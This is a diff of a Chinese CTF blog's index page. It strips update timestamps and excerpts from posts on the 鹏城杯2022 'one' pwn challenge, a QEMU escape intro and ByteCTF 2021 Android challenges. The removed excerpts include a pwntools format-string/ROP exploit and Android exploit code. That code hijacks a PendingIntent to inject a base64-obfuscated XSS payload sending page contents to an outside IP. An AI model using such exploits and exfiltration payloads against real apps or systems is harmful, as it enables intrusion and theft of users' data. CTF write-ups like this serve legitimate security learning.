@@ -214,13 +214,6 @@
 
               <time title="创建时间：2022-07-04 09:09:43" itemprop="dateCreated datePublished" datetime="2022-07-04T09:09:43+08:00">2022-07-04</time>
             </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-06-26 15:11:59" itemprop="dateModified" datetime="2025-06-26T15:11:59+08:00">2025-06-26</time>
-              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -243,9 +236,16 @@
 
       
           <p>格式化字符串漏洞</p>
-<img src="/2022/07/04/%E9%B9%8F%E5%9F%8E%E6%9D%AF2022-one/1.png" class="">
+<img src="/2022/07/04/%E9%B9%8F%E5%9F%8E%E6%9D%AF2022-one/1.png" class>
 <p>利用格式化字符串改写main函数的栈中rbp，并将返回地址改为leave ret的地址，这样main函数返回时就可以栈迁移到可控区</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh = process(&#x27;./one&#x27;,env = &#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc-2.31.so&#x27;&#125;)</span></span><br><span class="line">sh = remote(<span class="string">&#x27;192.168.1.106&#x27;</span>,<span class="number">9999</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./one&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;gift:&#x27;</span>)</span><br><span class="line">stack_addr = <span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop = <span class="literal">True</span>),<span class="number">16</span>)</span><br><span class="line">sh.sendafter(<span class="string">&#x27;name:&#x27;</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line">sh.sendafter(<span class="string">&#x27;password:&#x27;</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line">elf_base = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x11a0</span></span><br><span class="line">leave_ret = elf_base + <span class="number">0x1409</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;elf_base=&#x27;</span>,<span class="built_in">hex</span>(elf_base)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;stack_addr=&#x27;</span>,<span class="built_in">hex</span>(stack_addr)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>( (stack_addr + <span class="number">0x18</span>) &amp; <span class="number">0xffff</span>) + <span class="string">&#x27;c%9$hn&#x27;</span>.ljust(<span class="number">18</span>,<span class="string">&#x27;a&#x27;</span>) + p64(stack_addr - <span class="number">0xf0</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">map</span> = &#123;&#125;</span><br><span class="line">rop_addr = stack_addr + <span class="number">0xd8</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">   x = rop_addr &amp; <span class="number">0xff</span></span><br><span class="line">   rop_addr = rop_addr &gt;&gt; <span class="number">8</span></span><br><span class="line">   <span class="built_in">map</span>[x] = i</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>,<span class="number">12</span>):</span><br><span class="line">   x = leave_ret &amp; <span class="number">0xff</span></span><br><span class="line">   leave_ret = leave_ret &gt;&gt; <span class="number">8</span></span><br><span class="line">   <span class="built_in">map</span>[x] = i</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">map</span> = <span class="built_in">sorted</span>(<span class="built_in">map</span>.items(),key=<span class="keyword">lambda</span> x:x[<span class="number">0</span>],reverse=<span class="literal">False</span>)</span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">pre = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">map</span>:</span><br><span class="line">   delta = x[<span class="number">0</span>] - pre</span><br><span class="line">   <span class="keyword">if</span> delta == <span class="number">0</span>:</span><br><span class="line">      payload += <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">22</span> + x[<span class="number">1</span>]) + <span class="string">&#x27;$hhn&#x27;</span></span><br><span class="line">   <span class="keyword">else</span>:</span><br><span class="line">      payload += <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(delta) + <span class="string">&#x27;c%&#x27;</span> + <span class="built_in">str</span>(<span class="number">22</span> + x[<span class="number">1</span>]) + <span class="string">&#x27;$hhn&#x27;</span></span><br><span class="line">   pre = x[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">len</span>(payload)</span><br><span class="line">payload = payload.ljust(<span class="number">128</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">   payload += p64(stack_addr + <span class="number">0x810</span> + i)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">   payload += p64(stack_addr + <span class="number">0x818</span> + i)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> payload</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">len</span>(payload)</span><br><span class="line"></span><br><span class="line">pop_rdi = elf_base + <span class="number">0x0000000000001543</span></span><br><span class="line">pop_rsi = elf_base + <span class="number">0x0000000000001541</span></span><br><span class="line">read_addr = elf_base + <span class="number">0x1190</span></span><br><span class="line"><span class="comment">#add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax] ; ret</span></span><br><span class="line">gadgets = elf_base + <span class="number">0x0000000000001272</span></span><br><span class="line">pop_rbx = elf_base + <span class="number">0x153a</span></span><br><span class="line">stdout_ptr = elf_base + <span class="number">0x4020</span></span><br><span class="line">csu_call = elf_base + <span class="number">0x1520</span></span><br><span class="line">read_got = elf_base + elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">alarm_plt = elf_base + <span class="number">0x1170</span></span><br><span class="line">pop_rbp = elf_base + <span class="number">0x0000000000001273</span></span><br><span class="line">bss = elf_base + <span class="number">0x4050</span></span><br><span class="line"></span><br><span class="line">flag_addr = stack_addr + <span class="number">0x1f8</span></span><br><span class="line"><span class="comment">#修改stdout为syscall</span></span><br><span class="line">rop = p64(pop_rbx) + p64(<span class="number">0x100000000</span> - <span class="number">0xdee8b</span>) + p64(stdout_ptr + <span class="number">0x3d</span>) + p64(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line">rop += p64(gadgets)</span><br><span class="line">rop += p64(pop_rdi) + p64(<span class="number">2</span>) + p64(alarm_plt) + p64(pop_rdi) + p64(<span class="number">0</span>) + p64(alarm_plt)</span><br><span class="line"></span><br><span class="line">rop += p64(pop_rbx) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + p64(stdout_ptr)</span><br><span class="line">rop += p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(<span class="number">0</span>) + p64(stdout_ptr) + p64(csu_call + <span class="number">9</span>) + p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">next_rop_addr = stack_addr + <span class="number">0x200</span></span><br><span class="line">rop += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(<span class="number">0</span>) + p64(next_rop_addr) + p64(<span class="number">0x1000</span>) + p64(read_got)</span><br><span class="line">rop += p64(csu_call) + <span class="string">&#x27;flag.txt&#x27;</span></span><br><span class="line"></span><br><span class="line">payload += rop</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">len</span>(payload)</span><br><span class="line"></span><br><span class="line">raw_input()</span><br><span class="line">sh.sendafter(<span class="string">&#x27;!!!&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">rop = p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(<span class="number">1</span>) + p64(flag_addr) + p64(<span class="number">0x100</span>) + p64(read_got) <span class="comment">#read</span></span><br><span class="line">rop += p64(csu_call) + p64(<span class="number">0</span>)</span><br><span class="line">rop += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(<span class="number">2</span>) + p64(flag_addr) + p64(<span class="number">0x100</span>) + p64(stdout_ptr)</span><br><span class="line">rop += p64(pop_rdi) + p64(<span class="number">1</span>) + p64(alarm_plt) + p64(alarm_plt)</span><br><span class="line">rop += p64(csu_call) + p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">raw_input()</span><br><span class="line">sh.send(rop)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2022/07/04/%E9%B9%8F%E5%9F%8E%E6%9D%AF2022-one/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -290,13 +290,6 @@
 
               <time title="创建时间：2022-01-28 09:21:09" itemprop="dateCreated datePublished" datetime="2022-01-28T09:21:09+08:00">2022-01-28</time>
             </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-06-26 18:19:50" itemprop="dateModified" datetime="2025-06-26T18:19:50+08:00">2025-06-26</time>
-              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -327,7 +320,7 @@
 
       
           <h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>虚拟机逃逸，通过利用虚拟机程序本身存在的漏洞，我们可以控制虚拟机程序在宿主机上执行任意代码。虚拟机虚拟出各种设备给guest系统使用，这些虚拟设备只是虚拟机程序中的一个模块，如果这些设备存在漏洞，便可以利用起来进行逃逸。<br><img src="https://p2.ssl.qhimg.com/t0199d1e4172018dfc9.jpg"></p>
-<h2 id="0x02-PCI设备"><a href="#0x02-PCI设备" class="headerlink" title="0x02 PCI设备"></a>0x02 PCI设备</h2><h3 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h3><p>不管是虚拟设备还是实体硬件设备，都是遵循了设备的定义规范的，PCI设备的内存布局如下<br><img src="https://p3.ssl.qhimg.com/t019dc660426bcc29c2.png"><br>注册一个设备，事实上就是将这样的内存布局初始化完成。在qemu中，硬件的初始化是从<code>pc_init1</code>函数开始的，并且PIC总线也是在这里开始初始化</p>
+<h2 id="0x02-PCI设备"><a href="#0x02-PCI设备" class="headerlink" title="0x02 PCI设备"></a>0x02 PCI设备</h2>
           <!--noindex-->
             <div class="post-button">
               <a class="btn" href="/2022/01/28/RWCTF2021-Black-BOX/#more" rel="contents">
@@ -380,13 +373,6 @@
 
               <time title="创建时间：2021-10-17 18:47:07" itemprop="dateCreated datePublished" datetime="2021-10-17T18:47:07+08:00">2021-10-17</time>
             </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-06-26 14:31:44" itemprop="dateModified" datetime="2025-06-26T14:31:44+08:00">2025-06-26</time>
-              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -412,9 +398,6 @@
 <img src="/2021/10/17/bytectf2021-babydroid/1.png" class>
 
 <p>MainActivity.java</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bytectf.pwnbabydroid;</span><br><span class="line"><span class="keyword">import</span> android.app.Activity;</span><br><span class="line"><span class="keyword">import</span> android.content.ContentValues;</span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.net.Uri;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.provider.MediaStore;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">Activity</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        <span class="type">Intent</span> <span class="variable">extra</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">        extra.setFlags(Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION | Intent.FLAG_GRANT_PREFIX_URI_PERMISSION | Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION);</span><br><span class="line">        extra.setClassName(getPackageName(), <span class="string">&quot;com.bytectf.pwnbabydroid.FlagHunter&quot;</span>); extra.setData(Uri.parse(<span class="string">&quot;content://androidx.core.content.FileProvider/&quot;</span>));</span><br><span class="line">        <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">        intent.setClassName(<span class="string">&quot;com.bytectf.babydroid&quot;</span>, <span class="string">&quot;com.bytectf.babydroid.Vulnerable&quot;</span>);</span><br><span class="line">        intent.putExtra(<span class="string">&quot;intent&quot;</span>, extra);</span><br><span class="line">        intent.setAction(<span class="string">&quot;com.bytectf.TEST&quot;</span>);</span><br><span class="line">        startActivity(intent);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>FlagHunter.java</p>
           <!--noindex-->
             <div class="post-button">
               <a class="btn" href="/2021/10/17/bytectf2021-babydroid/#more" rel="contents">
@@ -467,13 +450,6 @@
 
               <time title="创建时间：2021-10-17 18:47:07" itemprop="dateCreated datePublished" datetime="2021-10-17T18:47:07+08:00">2021-10-17</time>
             </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-06-26 14:35:08" itemprop="dateModified" datetime="2025-06-26T14:35:08+08:00">2025-06-26</time>
-              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -498,8 +474,6 @@
           <p>url校验不充分，我们注册了ha1vktoutiao.com，并绑定了自己的服务器，实现了校验的绕过</p>
 <img src="/2021/10/17/bytectf2021-easydroid/1.png" class>
 <p>TestActivity中的WebView允许执行JS，而Flag存储在Cookie数据库里</p>
-<img src="/2021/10/17/bytectf2021-easydroid/2.png" class>
-<p>利用软连接创建一个symlink.html指向Cookies数据库，然后在加载我们自己的网页时注入一个XSS到Cookie中<br>MainActivity.java</p>
           <!--noindex-->
             <div class="post-button">
               <a class="btn" href="/2021/10/17/bytectf2021-easydroid/#more" rel="contents">
@@ -552,13 +526,6 @@
 
               <time title="创建时间：2021-10-17 18:47:07" itemprop="dateCreated datePublished" datetime="2021-10-17T18:47:07+08:00">2021-10-17</time>
             </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-06-26 14:38:25" itemprop="dateModified" datetime="2025-06-26T14:38:25+08:00">2025-06-26</time>
-              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -583,8 +550,6 @@
           <p>PendingIntent使用了空的Intent，因此我们可以在其他APP中劫持PendingIntent，任意修改Intent的action，实现广播</p>
 <img src="/2021/10/17/bytectf2021-mediumdroid/1.png" class>
 <p>与easydroid的思路类似，我们利用PendingIntent发送com.bytectf.SET_FLAG的广播，目的是在flag文件中注入一段XSS，然后利用软连接建立一个symlink.html，并加载，实现将整个flag文件反弹<br>MainActivity.java</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bytectf.pwnmediumdroid;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.app.Activity;</span><br><span class="line"><span class="keyword">import</span> android.app.PendingIntent;</span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.net.Uri;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">Activity</span> &#123;</span><br><span class="line">    EditText ed;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        <span class="comment">/*ed = new EditText(this);</span></span><br><span class="line"><span class="comment">        setContentView(ed);</span></span><br><span class="line"><span class="comment">        launch(&quot;a&quot;);*/</span></span><br><span class="line">        symlink();</span><br><span class="line">        HijackNotification();</span><br><span class="line">        <span class="type">Intent</span> <span class="variable">i</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">        i.setClassName(<span class="string">&quot;com.bytectf.mediumdroid&quot;</span>,<span class="string">&quot;com.bytectf.mediumdroid.MainActivity&quot;</span>);</span><br><span class="line">        i.setData(Uri.parse(<span class="string">&quot;http://www.ha1vktoutiao.com&quot;</span>));</span><br><span class="line">        startActivity(i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">HijackNotification</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Thread</span> <span class="variable">t</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="keyword">while</span> (MagicService.sbn == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        Thread.sleep(<span class="number">10</span>);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                runOnUiThread(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                        <span class="comment">//获取程序的PendingIntent</span></span><br><span class="line">                        <span class="type">PendingIntent</span> <span class="variable">pendingIntent</span> <span class="operator">=</span> MagicService.sbn.getNotification().contentIntent;</span><br><span class="line">                        <span class="type">Intent</span> <span class="variable">vunlnIntent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(<span class="string">&quot;com.bytectf.SET_FLAG&quot;</span>);</span><br><span class="line">                        vunlnIntent.setPackage(<span class="string">&quot;com.bytectf.mediumdroid&quot;</span>);</span><br><span class="line">                        vunlnIntent.putExtra(<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;x = &#x27;&lt;img src=\&quot;x\&quot; onerror=\&quot;eval(decodeURI(atob(&#x27;bmV3JTIwSW1hZ2UoKS5zcmMlMjA9JTIwJTIyaHR0cDovLzE5Mi4zLjgxLjEwMi8/Y29va2llPSUyMiUyMCslMjB3aW5kb3cuYnRvYShlbmNvZGVVUkkoZG9jdW1lbnQuZ2V0RWxlbWVudHNCeVRhZ05hbWUoJTIyaHRtbCUyMiklNUIwJTVELmlubmVySFRNTCkpOw==&#x27;)))\&quot;&gt;&#x27;&quot;</span>);</span><br><span class="line">                        Log.e(<span class="string">&quot;PendingIntent&quot;</span>,<span class="string">&quot;okok&quot;</span>);</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            pendingIntent.send(MainActivity.<span class="built_in">this</span>,<span class="number">0</span>,vunlnIntent);</span><br><span class="line">                            <span class="comment">//sendBroadcast(vunlnIntent);</span></span><br><span class="line">                            Log.e(<span class="string">&quot;PendingIntent&quot;</span>,<span class="string">&quot;finish&quot;</span>);</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                            Log.e(<span class="string">&quot;PendingIntent&quot;</span>,e.toString());</span><br><span class="line">                            e.printStackTrace();</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="type">Intent</span> <span class="variable">i</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">                        i.setClassName(<span class="string">&quot;com.bytectf.mediumdroid&quot;</span>,<span class="string">&quot;com.bytectf.mediumdroid.MainActivity&quot;</span>);</span><br><span class="line">                        i.setData(Uri.parse(<span class="string">&quot;http://www.ha1vktoutiao.com/stage2.html&quot;</span>));</span><br><span class="line">                        startActivity(i);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        t.start();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> String <span class="title function_">symlink</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">root</span> <span class="operator">=</span> getApplicationInfo().dataDir;</span><br><span class="line">            <span class="type">String</span> <span class="variable">symlink</span> <span class="operator">=</span> root + <span class="string">&quot;/symlink.html&quot;</span>;</span><br><span class="line">            <span class="type">String</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="string">&quot;/data/data/com.bytectf.mediumdroid/files/flag&quot;</span>;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;rm &quot;</span> + symlink).waitFor();</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;ln -s &quot;</span> + flag + <span class="string">&quot; &quot;</span> + symlink).waitFor();</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;chmod -R 777 &quot;</span> + root).waitFor();</span><br><span class="line">            <span class="keyword">return</span> symlink;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">launch</span><span class="params">(String url)</span> &#123;</span><br><span class="line">        <span class="type">Intent</span> <span class="variable">extra</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">        extra.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK);</span><br><span class="line">        extra.setClassName(<span class="string">&quot;com.bytectf.mediumdroid&quot;</span>, <span class="string">&quot;com.bytectf.mediumdroid.TestActivity&quot;</span>);</span><br><span class="line">        extra.putExtra(<span class="string">&quot;url&quot;</span>,<span class="string">&quot;http://www.ha1vktoutiao.com/notify.html&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">url_str</span> <span class="operator">=</span> extra.toUri(Intent.URI_INTENT_SCHEME);</span><br><span class="line">        ed.setText(url_str);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>MagicService.java</p>
           <!--noindex-->
             <div class="post-button">
               <a class="btn" href="/2021/10/17/bytectf2021-mediumdroid/#more" rel="contents">
@@ -637,13 +602,6 @@
 
               <time title="创建时间：2021-08-17 11:17:31" itemprop="dateCreated datePublished" datetime="2021-08-17T11:17:31+08:00">2021-08-17</time>
             </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-06-26 18:25:36" itemprop="dateModified" datetime="2025-06-26T18:25:36+08:00">2025-06-26</time>
-              </span>
             <span class="post-meta-item">
